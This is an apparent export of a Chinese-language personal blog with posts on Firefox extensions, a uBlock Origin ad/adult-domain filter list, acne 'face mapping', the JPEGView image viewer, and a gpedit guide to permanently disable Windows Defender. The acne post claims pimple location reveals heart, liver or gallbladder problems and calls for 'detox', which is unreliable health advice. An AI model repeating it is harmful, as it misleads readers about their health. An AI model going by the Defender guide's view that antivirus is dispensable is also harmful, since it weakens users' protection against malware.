<h1 id="8-Tabby-Window-amp-Tab-Manager"><a href="#8-Tabby-Window-amp-Tab-Manager" class="headerlink" title="8. Tabby - Window &amp; Tab Manager"></a><a href="https://addons.mozilla.org/zh-TW/firefox/addon/tabby-window-tab-manager/">8. Tabby - Window &amp; Tab Manager</a></h1><p>Tabby 幫助您輕鬆管理大量窗口和選項卡； 它可以幫助您在選項卡和窗口上快速打開、關閉、移動、固定和執行許多其他操作。 使用 Tabby，您甚至可以一鍵保存所有窗口和選項卡以供日後使用！ </p>
<img src="/2022/02/08/web-extensions-others/tabby.png" class="">

<hr style="border:2px solid grey"></hr>

<h1 id="9-Tampermonkey"><a href="#9-Tampermonkey" class="headerlink" title="9. Tampermonkey"></a><a href="https://addons.mozilla.org/zh-TW/firefox/addon/tampermonkey/">9. Tampermonkey</a></h1><p>Tampermonkey 是世界上最受歡迎的用戶腳本管理器。 </p>
<img src="/2022/02/08/web-extensions-others/tampermonkey.png" class="">

<hr style="border:2px solid grey"></hr>

<h1 id="10-Undo-Close-Tab"><a href="#10-Undo-Close-Tab" class="headerlink" title="10. Undo Close Tab"></a><a href="https://addons.mozilla.org/zh-TW/firefox/addon/undoclosetabbutton/">10. Undo Close Tab</a></h1><p>允許您通過單擊恢復剛剛關閉的選項卡，此外它還可以在方便的上下文菜單中提供最近關閉的選項卡列表。 </p>
<img src="/2022/02/08/web-extensions-others/Undotab.png" class="">

<hr style="border:2px solid grey"></hr>

<h1 id="11-Bitwarden-Password-Manager"><a href="#11-Bitwarden-Password-Manager" class="headerlink" title="11. Bitwarden - Password Manager"></a><a href="https://addons.mozilla.org/zh-TW/firefox/addon/bitwarden-password-manager/">11. Bitwarden - Password Manager</a></h1><p>安全、免費、跨平台的密碼管理工具</p>
<img src="/2022/02/08/web-extensions-others/Bitwarden.png" class="">

<hr style="border:2px solid grey"></hr>

<h1 id="12-Youtube-Audio"><a href="#12-Youtube-Audio" class="headerlink" title="12. Youtube Audio"></a><a href="https://addons.mozilla.org/en-US/firefox/addon/youtube-audio/">12. Youtube Audio</a></h1><p>僅流式傳輸來自 YouTube 的音頻以節省帶寬和電池壽命</p>
<img src="/2022/02/08/web-extensions-others/youtube%20audio.png" class="">

<hr style="border:2px solid grey"></hr>

<h1 id="13-Youtube-NonStop"><a href="#13-Youtube-NonStop" class="headerlink" title="13. Youtube NonStop"></a><a href="https://addons.mozilla.org/en-US/firefox/addon/youtube-nonstop">13. Youtube NonStop</a></h1><p>厭倦了讓“暫停視頻。繼續觀看？” 確認對話？<br>此擴展可以自動化它，因此您可以不間斷地收聽自己喜歡的音樂。</p>
<img src="/2022/02/08/web-extensions-others/youtube%20nonstop.png" class="">]]></content>
      <categories>
        <category>Browser</category>
      </categories>
      <tags>
        <tag>Extensions</tag>
        <tag>推薦</tag>
      </tags>
  </entry>
  <entry>
    <title>瀏覽器插件推薦 - 保護你上網安全 (Privacy)</title>
    <url>/2021/12/11/web-extensions-privacy/</url>
    <content><![CDATA[<p align="center">
    <img src="/img/Post/image/Browser/cover.png" width="auto" style="border-radius: 60%;"/>
    <b><span style="font-size:larger;">瀏覽器插件</span></b>
    <center>私隱安全是應該極高度要重視的。</center>
</p>

<h1 id="Privacy-類別的瀏覽器插件-排名不分先後"><a href="#Privacy-類別的瀏覽器插件-排名不分先後" class="headerlink" title="Privacy 類別的瀏覽器插件 (排名不分先後)"></a>Privacy 類別的瀏覽器插件 (排名不分先後)</h1><p>以下連結會帶你去到官方網站或者 Github。</p>
<ul>
<li><a href="https://privacybadger.org/">1. Privacy Badger</a></li>
<li><a href="https://www.ghostery.com/">2. Ghostery – Privacy Ad Blocker</a></li>
<li><a href="https://noscript.net/">3. No Script</a></li>
<li><a href="https://www.eff.org/https-everywhere">4. HTTPS Everywhere</a></li>
<li><a href="https://gitlab.com/KevinRoebert/ClearUrls">5. ClearURLs</a></li>
<li><a href="http://adguard.com/">6. AdGuard AdBlocker</a></li>
<li><a href="https://decentraleyes.org/">7. Decentraleyes</a></li>
<li><a href="https://duckduckgo.com/app">8. DuckDuckGo Privacy Essentials</a></li>
<li><a href="https://github.com/gorhill/uBlock#ublock-origin">9. uBlock Origin</a></li>
<li><a href="https://github.com/Cookie-AutoDelete/Cookie-AutoDelete">10. Cookie AutoDelete</a></li>
<li><a href="https://github.com/mozilla/contain-facebook">11. Facebook Container</a></li>
</ul>
<span id="more"></span>

<hr style="border:2px solid grey"></hr>

<h1 id="1-Privacy-Badger"><a href="#1-Privacy-Badger" class="headerlink" title="1. Privacy Badger"></a><a href="https://addons.mozilla.org/zh-TW/firefox/addon/privacy-badger17/">1. Privacy Badger</a></h1><p>Privacy Badger 是由電子前哨基金會開發的適用於Google Chrome與Firefox瀏覽器的隱私保護擴充功能，<br>其用於阻止那些不遵守DNT協定的廣告商跟蹤行為。</p>
<p>隱私獾能夠自動檢測潛在的跟蹤器並阻止跟蹤行為，不同性質的跟蹤器將會呈現綠色、黃色與紅色的滾軸，您可以隨時根據需求調整這些滾軸。</p>
<ul>
<li><p>綠色：有第三方資源，但未檢測出跟蹤行為，不做任何攔截。在首次安裝隱私獾後，所有的第三方資源都會呈現綠色，<br>但在使用一段時間後部分跟蹤行為將會被辨識並攔截處理。</p>
</li>
<li><p>黃色：有第三方資源，並且檢測出跟蹤行為，但為避免網頁顯示異常，沒有完全攔截跟蹤器，但跟蹤性Cookie將會被攔截。</p>
</li>
<li><p>紅色：有第三方資源，並且檢測出跟蹤行為，徹底攔截跟蹤器與跟蹤Cookie。</p>
</li>
</ul>
<img src="/2021/12/11/web-extensions-privacy/privacy-badger.png" class="">

<hr style="border:2px solid grey"></hr>

<h1 id="2-Ghostery-–-Privacy-Ad-Blocker"><a href="#2-Ghostery-–-Privacy-Ad-Blocker" class="headerlink" title="2. Ghostery – Privacy Ad Blocker"></a><a href="https://addons.mozilla.org/zh-TW/firefox/addon/ghostery/">2. Ghostery – Privacy Ad Blocker</a></h1><p>Ghostery 是一款適用於Chrome與Firefox瀏覽器的隱私保護擴充，用於阻斷各類跟蹤器。能夠阻斷包括廣告、成人廣告、社群媒體、音訊播放器在內的多種跟蹤器並向使用者報告瀏覽網站跟蹤行為。</p>
<img src="/2021/12/11/web-extensions-privacy/ghostery.png" class="">

<hr style="border:2px solid grey"></hr>

<h1 id="3-No-Script"><a href="#3-No-Script" class="headerlink" title="3. No Script"></a><a href="https://addons.mozilla.org/zh-TW/firefox/addon/noscript/">3. No Script</a></h1><p>僅開放您所信任的網站執行動態元素，保護您免於 XSS 跨站攻擊。以白名單選擇性執行 JavaScript、Java、Flash、Sliverlight 以及其它外掛程式和指令碼內容。</p>
<img src="/2021/12/11/web-extensions-privacy/no-script.png" class="">

<hr style="border:2px solid grey"></hr>

<h1 id="4-HTTPS-EveryWhere"><a href="#4-HTTPS-EveryWhere" class="headerlink" title="4. HTTPS EveryWhere"></a><a href="https://addons.mozilla.org/en-US/firefox/addon/https-everywhere">4. HTTPS EveryWhere</a></h1><p>HTTPS Everywhere是一個自由且開源的瀏覽器擴充功能，支援Google Chrome、Mozilla Firefox和Opera，由非營利組織Tor專案和電子前哨基金會（EFF）共同開發。 該外掛程式會在網站支援的情況下自動轉用更安全的HTTPS連接，減少使用HTTP的情況。</p>
<img src="/2021/12/11/web-extensions-privacy/https-everywhere.png" class="">

<hr style="border:2px solid grey"></hr>

<h1 id="5-ClearURLs"><a href="#5-ClearURLs" class="headerlink" title="5. ClearURLs"></a><a href="https://addons.mozilla.org/en-US/firefox/addon/clearurls/">5. ClearURLs</a></h1><p>從 URL 中刪除跟踪元素。</p>
<img src="/2021/12/11/web-extensions-privacy/clearurls.png" class="">

<hr style="border:2px solid grey"></hr>

<h1 id="6-AdGuard-AdBlocker"><a href="#6-AdGuard-AdBlocker" class="headerlink" title="6. AdGuard AdBlocker"></a><a href="https://addons.mozilla.org/en-US/firefox/addon/adguard-adblocker/">6. AdGuard AdBlocker</a></h1><p>AdGuard是一系列用於Mozilla Firefox、Google Chrome、Opera、Apple Safari、Yandex Browser、Microsoft Edge等網頁瀏覽器及跨平台內容過濾的廣告攔截和隱私保護軟體、開放原始碼和共享軟體的瀏覽器擴充程式產品，AdGuard允許使用者使用阻止廣告等頁面元素的顯示，藉此保護Microsoft Windows、Mac OS、Linux、Android和iOS等作業系統使用者免受不必要的廣告、彈出式視窗、影片、文字、橫幅、跟蹤、淫穢內容、惡意網站及軟體和網路釣魚的危害。</p>
<img src="/2021/12/11/web-extensions-privacy/adguard.png" class="">

<hr style="border:2px solid grey"></hr>

<h1 id="7-Decentraleyes"><a href="#7-Decentraleyes" class="headerlink" title="7. Decentraleyes"></a><a href="https://addons.mozilla.org/en-US/firefox/addon/decentraleyes/">7. Decentraleyes</a></h1><p>保護您不受「免費」、中心化的內容傳遞網路（CDN）的追蹤。此附加元件可防止您的瀏覽器送出請求到 Google Hosted Libraries 這類的服務，並在本機提供程式庫以達到相同的效果，而不造成網頁錯誤。可補充一般內容封鎖器的功能，保護使用者免遭集中的內容交付網路（CDN）的跟蹤。</p>
<img src="/2021/12/11/web-extensions-privacy/dec.png" class="">

<hr style="border:2px solid grey"></hr>

<h1 id="8-DuckDuckGo-Privacy-Essentials"><a href="#8-DuckDuckGo-Privacy-Essentials" class="headerlink" title="8. DuckDuckGo Privacy Essentials"></a><a href="https://addons.mozilla.org/en-US/firefox/addon/duckduckgo-for-firefox/">8. DuckDuckGo Privacy Essentials</a></h1><p>保障私隱，從此簡單容易。我們的附加元件提供最全面的私隱保障工具，無論在網絡上的任何地域都可以有效控制你的個人資料：攔截追蹤、更高智能的加密功能、DuckDuckGo 隱藏搜尋等等，全面功能包羅萬有。</p>
<img src="/2021/12/11/web-extensions-privacy/ddg.png" class="">

<hr style="border:2px solid grey"></hr>

<h1 id="9-uBlock-Origin"><a href="#9-uBlock-Origin" class="headerlink" title="9. uBlock Origin"></a><a href="https://addons.mozilla.org/zh-TW/firefox/addon/ublock-origin/">9. uBlock Origin</a></h1><p>一個高效率的阻擋器，使用不多的 CPU 及記憶體資源</p>
<img src="/2021/12/11/web-extensions-privacy/ublock-origin.png" class="">
<img src="/2021/12/11/web-extensions-privacy/ublock-origin-2.png" class="">
<img src="/2021/12/11/web-extensions-privacy/ublock-origin-3.png" class="">

<hr style="border:2px solid grey"></hr>

<h1 id="10-Cookie-AutoDelete"><a href="#10-Cookie-AutoDelete" class="headerlink" title="10. Cookie AutoDelete"></a><a href="https://addons.mozilla.org/en-US/firefox/addon/cookie-autodelete/">10. Cookie AutoDelete</a></h1><p>控制你的 Cookies！ 這個插件的靈感來自自毀 Cookie，當一個選項卡關閉時，所有未使用的 cookie 都會被自動刪除。<br>保留您信任的那些（永遠/直到重新啟動），同時刪除其餘部分，支持的容器。</p>
<img src="/2021/12/11/web-extensions-privacy/auto.png" class="">

<hr style="border:2px solid grey"></hr>

<h1 id="11-Facebook-Container"><a href="#11-Facebook-Container" class="headerlink" title="11. Facebook Container"></a><a href="https://addons.mozilla.org/en-US/firefox/addon/facebook-container/">11. Facebook Container</a></h1><p>防止 Facebook 在網絡上跟踪您。 Firefox 的 Facebook Container 擴展可幫助您控制和隔離您的網絡活動與 Facebook。</p>
<img src="/2021/12/11/web-extensions-privacy/facebook-container.png" class="">]]></content>
      <categories>
        <category>Browser</category>
      </categories>
      <tags>
        <tag>Extensions</tag>
        <tag>推薦</tag>
      </tags>
  </entry>
  <entry>
    <title>瀏覽器插件推薦 - 讓你的瀏覽器更美麗 (Themes)</title>
    <url>/2022/02/08/web-extensions-themes/</url>
    <content><![CDATA[<p align="center">
    <img src="/img/Post/image/Browser/cover.png" width="auto" style="border-radius: 60%;"/>
    <b><span style="font-size:larger;">瀏覽器插件</span></b>
    <center>讓你的瀏覽器更美麗。</center>
</p>

<h1 id="主題類的瀏覽器插件推薦-排名不分先後"><a href="#主題類的瀏覽器插件推薦-排名不分先後" class="headerlink" title="主題類的瀏覽器插件推薦 (排名不分先後)"></a>主題類的瀏覽器插件推薦 (排名不分先後)</h1><p>以下連結會帶你去到官方網站或者 Github。</p>
<ul>
<li><a href="https://color.firefox.com/">Firefox Color</a></li>
<li><a href="https://darkreader.org/">Dark Reader</a></li>
</ul>
<h2 id="1-Firefox-Color"><a href="#1-Firefox-Color" class="headerlink" title="1. Firefox Color"></a><a href="https://addons.mozilla.org/zh-TW/firefox/addon/firefox-color/">1. Firefox Color</a></h2><p>構建、保存和分享漂亮的 Firefox 主題。</p>
<img src="/2022/02/08/web-extensions-themes/firefox%20color.png" class="">

<hr>
<h2 id="2-Dark-Rader"><a href="#2-Dark-Rader" class="headerlink" title="2. Dark Rader"></a><a href="https://addons.mozilla.org/en-US/firefox/addon/darkreader/">2. Dark Rader</a></h2><p>每個網站的暗模式。<br>照顧好你的眼睛，使用深色主題進行夜間和日常瀏覽。</p>
<img src="/2022/02/08/web-extensions-themes/dark%20reader.png" class="">

<hr style="border:2px solid grey"></hr>]]></content>
      <categories>
        <category>Browser</category>
      </categories>
      <tags>
        <tag>Extensions</tag>
        <tag>推薦</tag>
      </tags>
  </entry>
  <entry>
    <title>uBlock Origin - 黑名單名單</title>
    <url>/2022/02/08/web-extensions-ublock-origin-list/</url>
    <content><![CDATA[<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">!Youtube Cookies</span><br><span class="line">www.youtube.com##.opened</span><br><span class="line">www.youtube.com###dialog</span><br><span class="line">##.no-transition.yt-upsell-dialog-renderer.style-scope &gt; .yt-img-shadow.style-scope</span><br><span class="line"></span><br><span class="line">!Youtube Search With your voice</span><br><span class="line">###voice-search-button &gt; .size-default.style-default.ytd-masthead.style-scope &gt; .ytd-button-renderer.style-scope.yt-simple-endpoint &gt; .size-default.style-default.ytd-button-renderer.style-scope</span><br><span class="line">###voice-search-button</span><br><span class="line"></span><br><span class="line">!Google cookies</span><br><span class="line">www.google.com###i04Uwc</span><br><span class="line"></span><br><span class="line">##.TW_UTtoy</span><br><span class="line"></span><br><span class="line">!Jable.tv</span><br><span class="line">https://r.trwl1.com</span><br><span class="line">http://adserve.work</span><br><span class="line">http://dsj66.cn</span><br><span class="line">https://theporndude.com</span><br><span class="line">https://r.trwl1.com</span><br><span class="line">https://uuw73.com</span><br><span class="line">http://uus52.com</span><br><span class="line">https://r.trwl1.com</span><br><span class="line"></span><br><span class="line">!18av.mm-cg.com</span><br><span class="line">https://avapp.tv</span><br><span class="line">https://ioshow.mm-cg.com</span><br><span class="line">https://hhte18.com/</span><br><span class="line">https://ammcg.imgscloud.com</span><br><span class="line">https://bbs.mm-cg.com/</span><br><span class="line">https://52toy.cc/</span><br><span class="line">https://plumetoy.blogspot.com/</span><br><span class="line">https://lihi1.com/xixO2</span><br><span class="line">https://asex168.com</span><br><span class="line">https://asex0909316199.wixsite.com</span><br><span class="line">https://wwww.1919hdtv.com</span><br><span class="line">https://appdownload.1919hdtv.com</span><br><span class="line">http://www.homematch.com.tw </span><br><span class="line">https://m.asex168.com/</span><br><span class="line">18av.mm-cg.com##.TW_UTtoy</span><br><span class="line">18av.mm-cg.com###friendLink</span><br><span class="line">18av.mm-cg.com##.redbig</span><br><span class="line">18av.mm-cg.com###menu1Content &gt; .altto &gt; ul &gt; li</span><br><span class="line">18av.mm-cg.com##.ut_ad_box</span><br><span class="line">18av.mm-cg.com##span &gt; b</span><br><span class="line">18av.mm-cg.com##span:nth-of-type(4)</span><br><span class="line">18av.mm-cg.com##span:nth-of-type(7)</span><br><span class="line">18av.mm-cg.com##span:nth-of-type(5)</span><br><span class="line"></span><br><span class="line">!youav.com</span><br><span class="line">https://windycoding.com</span><br><span class="line"></span><br><span class="line">!Thisav</span><br><span class="line">https://thisav.54647.online</span><br><span class="line">https://click.dtiserv2.com</span><br><span class="line"></span><br><span class="line">!Avgle</span><br><span class="line">https://avgle.com</span><br><span class="line">https://javhd.com</span><br><span class="line">https://avgle.github.io</span><br><span class="line">http://www.poweredbyliquidfire.mobi</span><br><span class="line">https://l.tyrantdb.com</span><br><span class="line">http://avgle.io</span><br><span class="line">https://juicyads.in</span><br><span class="line"></span><br><span class="line">!Tube8</span><br><span class="line">https://www.tube8vip.com</span><br><span class="line">https://www.tube8.fr</span><br><span class="line">https://sexsimulator.game</span><br><span class="line">https://ads.trafficjunky.net</span><br><span class="line">http://as.sexad.net</span><br><span class="line">https://www.tube8.es</span><br><span class="line"></span><br><span class="line">!NetFlav</span><br><span class="line">https://netflav.com</span><br><span class="line">https://mitao69.pw</span><br><span class="line">http://cheersunny.com/</span><br><span class="line">https://mzone.pw</span><br><span class="line">https://yc13.net</span><br><span class="line">https://www.qingse.one/</span><br><span class="line">http://jzyh1.xyz</span><br><span class="line">http://kkdh7.top/</span><br><span class="line">https://nentt8.com/</span><br><span class="line">https://www.sejie8.xyz</span><br><span class="line">https://mimitd.com</span><br><span class="line">https://h365event.wine-api.net</span><br><span class="line"></span><br><span class="line">!Pornhub</span><br><span class="line">www.pornhub.com##.qkdfnhupjd</span><br><span class="line">www.pornhub.com###videoCategory &gt; .alpha</span><br><span class="line">www.pornhub.com##.backgroundImg</span><br><span class="line"></span><br><span class="line">! 2021-05-13 https://www.learnpython.org</span><br><span class="line">www.learnpython.org##.mt-2.d-lg-block.d-none.col-2</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">!BingFeng</span><br><span class="line">bingfeng.tw##div:nth-of-type(14)</span><br><span class="line">bingfeng.tw##div:nth-of-type(10)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">! 2021-11-16 https://www.linetv.tw</span><br><span class="line">www.linetv.tw##.whitespace-nowrap.text-center.font-500.text-ffffff.bg-opacity-70.bg-000000.items-center.justify-center.flex-col.flex.inset-0.absolute</span><br><span class="line">www.linetv.tw###player_html5_api</span><br><span class="line">www.linetv.tw##.vjs-big-play-button</span><br><span class="line">www.linetv.tw##.vjs-user-active.vjs-v7.vjs-workinghover.vjs-controls-enabled.player-dimensions.vjs-paused.vjs-linetv.vjs-fill.vjs-big-play-centered.video-js</span><br><span class="line">www.linetv.tw##div.aspect-ratio-content</span><br><span class="line">www.linetv.tw##.bg-000000.aspect-ratio--16x9.aspect-ratio &gt; .object-cover.aspect-ratio-content</span><br><span class="line"></span><br><span class="line">! 2021-11-19 https://www.wealth.com.tw</span><br><span class="line">www.wealth.com.tw##.C4LHX</span><br><span class="line"></span><br><span class="line">! 2021-12-04 https://studymoose.com</span><br><span class="line">studymoose.com##.open.showPopup-1.popup-wrapper.popup &gt; .popup-wrapper__overlay</span><br><span class="line">studymoose.com##.open.showPopup-1.popup-wrapper.popup</span><br><span class="line"></span><br><span class="line">! 2021-12-09 https://gradesfixer.com</span><br><span class="line">gradesfixer.com##.exit-popup</span><br><span class="line"></span><br><span class="line">! 2021-12-16 https://lagunawang.pixnet.net</span><br><span class="line">lagunawang.pixnet.net##.not-full-page.content-wrap</span><br><span class="line">lagunawang.pixnet.net##.new-style</span><br><span class="line">lagunawang.pixnet.net###ad-full-page</span><br><span class="line"></span><br></pre></td></tr></table></figure>]]></content>
      <categories>
        <category>Browser</category>
      </categories>
      <tags>
        <tag>Extensions</tag>
      </tags>
  </entry>
  <entry>
    <title>暗瘡成因</title>
    <url>/2022/01/26/why-make-acne/</url>
    <content><![CDATA[<h1 id="身體健康看面子，痘痘透露出的身體狀況"><a href="#身體健康看面子，痘痘透露出的身體狀況" class="headerlink" title="身體健康看面子，痘痘透露出的身體狀況"></a>身體健康看面子，痘痘透露出的身體狀況</h1><p>痘痘不只是年輕人的困擾，其實成年人也會深受其困擾，更有不少人是從青春期到成年都一直與痘痘對抗著。人的皮膚狀況能反映出身體是否健康，特別是臉上的皮膚狀況。痘痘的形成與日常生活作息有很大的關係，如果經常在某個部位長痘痘，可以藉由觀察痘痘的生長位置與形態，推測身體哪部分出了問題，調整生活型態以改善。</p>
<img src="/2022/01/26/why-make-acne/why.png" class="">

<h2 id="眉間：心、肺功能"><a href="#眉間：心、肺功能" class="headerlink" title="眉間：心、肺功能"></a>眉間：心、肺功能</h2><p>原因：心肺功能不好，容易胸悶，心律不整，心悸。<br>改善：不要做太過激烈的運動，避免煙、酒、辛辣食品。</p>
<h2 id="鼻頭：消化系統"><a href="#鼻頭：消化系統" class="headerlink" title="鼻頭：消化系統"></a>鼻頭：消化系統</h2><p>原因：胃火過盛，消化系統異常。<br>改善：少吃冰冷、油炸、重口味食物。飲食建議清淡。<br>鼻子屬脾胃，中醫所說的脾胃相當於西醫的消化系統。這個部位長痘痘，多與飲食有關，常見於愛吃高熱量食物，而且吃的口味比較重。</p>
<h2 id="臉頰：肺、肝功能-左肝右肺"><a href="#臉頰：肺、肝功能-左肝右肺" class="headerlink" title="臉頰：肺、肝功能(左肝右肺)"></a>臉頰：肺、肝功能(左肝右肺)</h2><p>右邊痘痘原因：肺功能失常。<br>改善：注意保養呼吸道，儘量避免芒果、芋頭、海鮮等易過敏的食物。</p>
<p>左邊痘痘原因：肝功能不順暢，有熱毒。<br>改善：作息正常，保持心情愉快，且不要讓身體處在悶熱的環境中。</p>
<h2 id="下巴：內分泌功能"><a href="#下巴：內分泌功能" class="headerlink" title="下巴：內分泌功能"></a>下巴：內分泌功能</h2><p>原因：內分泌失調。<br>改善：少吃冰冷的東西。</p>
<h2 id="額頭：壓力大、脾氣差"><a href="#額頭：壓力大、脾氣差" class="headerlink" title="額頭：壓力大、脾氣差"></a>額頭：壓力大、脾氣差</h2><p>原因：壓力大，脾氣差，造成心火和血液循環有問題。<br>改善：早睡早起，多喝水。<br>從中醫角度來說，額頭長痘痘是因為心火旺、血液循環和肝臟排毒不暢所致。如果你覺得最近脾氣很差，心情焦躁、心慌胸悶、睡不好，就是心火旺的徵兆。這類人心理壓力比較大，脾氣也不太好。</p>
<h2 id="太陽穴：吃太多加工食品"><a href="#太陽穴：吃太多加工食品" class="headerlink" title="太陽穴：吃太多加工食品"></a>太陽穴：吃太多加工食品</h2><p>原因：太陽穴附近出現小粉刺、痘痘，表示你的飲食中包含了過多的加工食品，造成膽囊阻塞。<br>改善：需要進行體內大掃除、排毒。</p>
<h2 id="鼻翼：生殖系統"><a href="#鼻翼：生殖系統" class="headerlink" title="鼻翼：生殖系統"></a>鼻翼：生殖系統</h2><p>原因：與卵巢機能或生殖系統有關。<br>改善：不要過度縱慾或禁慾，多到戶外呼吸新鮮空氣。</p>
<h2 id="唇邊：宿便、便秘"><a href="#唇邊：宿便、便秘" class="headerlink" title="唇邊：宿便、便秘"></a>唇邊：宿便、便秘</h2><p>原因：便秘導致體內毒素累積，或是使用含氟過量的牙膏。<br>改善：多吃高纖維的蔬菜水果。</p>
<p>內容轉自<br><a href="https://heho.com.tw/archives/733">https://heho.com.tw/archives/733</a></p>
]]></content>
      <categories>
        <category>知識</category>
      </categories>
  </entry>
  <entry>
    <title>JPEGView - Windows 睇圖工具</title>
    <url>/2022/02/01/windows-JPEGView/</url>
    <content><![CDATA[<h1 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h1><p>Windows 內建用黎睇圖既工具，<br>都真係幾唔好用，<br>有時仲冇畫面，<br>你用小畫家做 Default 又麻煩，<br>單純想係睇圖既話，<br>咁又多此一舉。</p>
<p>唔緊要！<br>我推薦一款工具叫 <a href="https://github.com/sylikc/jpegview">JPEGView</a>，<br>佢係 Open Source，<br>支援多種語言</p>
<h1 id="官方說明"><a href="#官方說明" class="headerlink" title="官方說明"></a>官方說明</h1><blockquote>
<p>JPEGView is a lean, fast and highly configurable viewer/editor for JPEG, BMP, PNG, WEBP, TGA, GIF and TIFF images with a minimal GUI. Basic on-the-fly image processing is provided - allowing adjusting typical parameters as sharpness, color balance, rotation, perspective, contrast and local under-/overexposure.</p>
</blockquote>
<h2 id="Features"><a href="#Features" class="headerlink" title="Features"></a>Features</h2><ul>
<li>Small and fast, uses SSE2 and up to 4 CPU cores</li>
<li>High quality resampling filter, preserving sharpness of images</li>
<li>Basic image processing tools can be applied realtime during viewing</li>
<li>Movie mode to play folder of JPEGs as movie</li>
</ul>
<h2 id="Github"><a href="#Github" class="headerlink" title="Github"></a>Github</h2><ul>
<li><a href="https://github.com/sylikc/jpegview">https://github.com/sylikc/jpegview</a></li>
</ul>
<h2 id="下載"><a href="#下載" class="headerlink" title="下載"></a>下載</h2><ul>
<li><a href="https://github.com/sylikc/jpegview/releases/download/v1.0.38/JPEGView_1.0.38.zip">https://github.com/sylikc/jpegview/releases/download/v1.0.38/JPEGView_1.0.38.zip</a></li>
</ul>
<img src="/2022/02/01/windows-JPEGView/download.gif" class="">

<h3 id="開圖"><a href="#開圖" class="headerlink" title="開圖"></a>開圖</h3><img src="/2022/02/01/windows-JPEGView/open-image.gif" class="">

<h3 id="左右箭嘴換圖"><a href="#左右箭嘴換圖" class="headerlink" title="左右箭嘴換圖"></a>左右箭嘴換圖</h3><p>如果你個 folder 有1張圖以上，<br>你可以用你鍵盤既 左右箭嘴 黎換圖。</p>
<img src="/2022/02/01/windows-JPEGView/left-right.gif" class="">

<h3 id="更改顯示語言"><a href="#更改顯示語言" class="headerlink" title="更改顯示語言"></a>更改顯示語言</h3><p>我地需要入去改佢個 ini files。</p>
<img src="/2022/02/01/windows-JPEGView/change-languages.gif" class="">

<p>另外 ….</p>
<p><span style="font-size:40px">佢係可以睇到 Gif 圖㗎 ！！！！！！</span></p>
]]></content>
      <categories>
        <category>Windows</category>
      </categories>
      <tags>
        <tag>Gui</tag>
        <tag>工具推薦</tag>
      </tags>
  </entry>
  <entry>
    <title>Windows 10 - 完全關閉內建防毒程式</title>
    <url>/2022/07/02/windows-10-off-the-fucking-windows-defender/</url>
    <content><![CDATA[<img src="windows 10 logo.svg" width="200px"/>

<h1 id="前言-一"><a href="#前言-一" class="headerlink" title="前言 (一)"></a>前言 (一)</h1><p>對於煩人的防毒軟件，主要原因不外乎四個原因。</p>
<ul>
<li>令你電腦變慢，多餘的工具。</li>
<li>檔案誤判為有毒，非常麻煩。</li>
<li>私隱問題，檔案被掃瞄沒有私隱。</li>
<li>不想見到它 XD</li>
</ul>
<p>本文章會教你如何將內建的防毒軟件完全關掉。</p>
<h1 id="前言-二"><a href="#前言-二" class="headerlink" title="前言 (二)"></a>前言 (二)</h1><p>雖然關閉防毒對於電腦的效能一定會有明顯的上升，但對於不懂電腦的人來說，我這邊是不建議將防毒去除，我會建議安裝其他第三方的防毒軟件，例如：</p>
<ul>
<li><a href="https://www.malwarebytes.com/">Malwarebytes</a>：一個殺毒軟件。</li>
<li><a href="https://www.bitdefender.com/">Bitdefender</a>：一個防毒軟件。</li>
</ul>
<h1 id="未關閉前"><a href="#未關閉前" class="headerlink" title="未關閉前"></a>未關閉前</h1><p>可見有非常多功能，防毒會隨便將你的檔案進行一次掃瞄，隨著時間關係，硬件的衰佬會因為防毒的關係急速下降，令到電腦變得很卡，對於一個懂電腦的人來說，防毒可以說是可有可無，意識遠遠大於工具。</p>
<p>另外，如果只是使用官方的教學將防毒關閉，也會不知道什麼時候突然自動開啟。</p>
<img src="/2022/07/02/windows-10-off-the-fucking-windows-defender/1.png" class="">

<hr>
<h1 id="gpedit-msc"><a href="#gpedit-msc" class="headerlink" title="gpedit.msc"></a>gpedit.msc</h1><p>以下操作需要使用 <code>系統管理員身份</code> 進行。</p>
<div class="note info flat">
    建議：有關 <code>系統管理員</code> 的內部操作，使用 <code>系統管理員帳號</code> 更變會更好。一般帳號只用於一般操作，兩者分開會最好。 
</div>

<h2 id="尋找-gpedit-msc"><a href="#尋找-gpedit-msc" class="headerlink" title="尋找 gpedit.msc"></a>尋找 gpedit.msc</h2><p>直接於右下角輸入 <code>gpedit.msc</code> 尋找，並使用 <code>系統管理員身份</code> 執行。</p>
<img src="/2022/07/02/windows-10-off-the-fucking-windows-defender/2.png" class="">

<h2 id="電腦設定"><a href="#電腦設定" class="headerlink" title="電腦設定"></a>電腦設定</h2><p>雙擊 Mouse 點擊 <code>電腦設定</code>。</p>
<img src="/2022/07/02/windows-10-off-the-fucking-windows-defender/3.png" class="">

<h2 id="系統管理範本"><a href="#系統管理範本" class="headerlink" title="系統管理範本"></a>系統管理範本</h2><p>雙擊 Mouse 點擊 <code>系統管理範本</code>。</p>
<img src="/2022/07/02/windows-10-off-the-fucking-windows-defender/4.png" class="">

<h2 id="Windows-元件"><a href="#Windows-元件" class="headerlink" title="Windows 元件"></a>Windows 元件</h2><p>雙擊 Mouse 點擊 <code>Windows 元件</code>。</p>
<img src="/2022/07/02/windows-10-off-the-fucking-windows-defender/5.png" class="">

<h2 id="Microsoft-Defender-防毒軟體"><a href="#Microsoft-Defender-防毒軟體" class="headerlink" title="Microsoft Defender 防毒軟體"></a>Microsoft Defender 防毒軟體</h2><p>雙擊 Mouse 點擊 <code>Microsoft Defender 防毒軟體</code>。</p>
<img src="/2022/07/02/windows-10-off-the-fucking-windows-defender/6.png" class="">

<h2 id="關閉-Microsoft-Defender-防毒軟體-一"><a href="#關閉-Microsoft-Defender-防毒軟體-一" class="headerlink" title="關閉 Microsoft Defender 防毒軟體 (一)"></a>關閉 Microsoft Defender 防毒軟體 (一)</h2><p>雙擊 Mouse 點擊 <code>關閉 Microsoft Defender 防毒軟體</code>。</p>
<img src="/2022/07/02/windows-10-off-the-fucking-windows-defender/7.png" class="">

<h2 id="關閉-Microsoft-Defender-防毒軟體-二"><a href="#關閉-Microsoft-Defender-防毒軟體-二" class="headerlink" title="關閉 Microsoft Defender 防毒軟體 (二)"></a>關閉 Microsoft Defender 防毒軟體 (二)</h2><p>將原本的 <code>尚未設定(C)</code>，改為 <code>已啟用(E)</code>，然後點擊 <code>套用(A)</code>，再點擊 <code>確定</code>。</p>
<img src="/2022/07/02/windows-10-off-the-fucking-windows-defender/8.png" class="">

<hr>
